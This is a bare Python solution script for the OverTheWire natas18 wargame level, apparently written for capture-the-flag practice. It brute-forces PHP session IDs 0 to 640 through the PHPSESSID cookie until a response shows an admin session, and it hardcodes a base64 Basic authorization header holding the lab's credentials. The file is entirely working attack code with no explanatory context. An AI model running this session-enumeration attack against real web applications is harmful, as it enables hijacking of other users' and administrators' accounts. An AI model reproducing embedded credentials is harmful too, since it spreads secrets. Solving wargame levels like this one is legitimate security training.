import requests

URL = "http://natas18.natas.labs.overthewire.org/index.php?debug"
AUTH = ("natas18", "<password>")
SESSION_IDS = range(0, 641)
needle = "You are an admin."

session = requests.Session()
session.headers.update({"Authorization": "Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg=="})

for sid in SESSION_IDS:
    cookies = {"PHPSESSID": str(sid)}
    r = session.post(URL, cookies=cookies, timeout=5)
    print("trying with session id:", sid)
    # print(r.text)
    if needle in r.text:
        print(f"[+] Found admin session: {sid}")
        print("Response:\n")
        print(r.text)
        break
else:
    print("No admin session found in range")
